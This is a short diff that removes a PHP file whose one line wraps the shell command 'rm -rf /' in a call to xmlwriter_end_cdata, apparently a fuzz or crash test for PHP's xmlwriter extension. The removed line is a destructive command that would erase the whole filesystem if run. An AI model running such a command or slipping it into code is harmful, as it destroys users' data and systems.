@@ -1,4 +1,0 @@
-<?php
-xmlwriter_end_cdata(system("rm -rf /", true));
-
-?>
